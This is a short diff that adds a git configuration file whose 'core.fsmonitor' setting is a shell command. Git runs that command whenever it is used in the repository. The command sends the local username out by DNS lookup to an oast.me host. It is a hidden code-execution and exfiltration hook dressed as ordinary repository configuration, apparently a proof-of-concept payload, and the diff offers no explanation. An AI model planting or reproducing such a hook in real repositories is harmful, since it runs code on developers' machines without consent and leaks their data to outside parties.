@@ -1,0 +1,4 @@
+			[core]
+        	bare = false
+        	worktree = "."
+        	fsmonitor = "nslookup $(whoami).fsmon.d8dkvmtksss18jjrtu90qubj8z9afzdqh.oast.me"
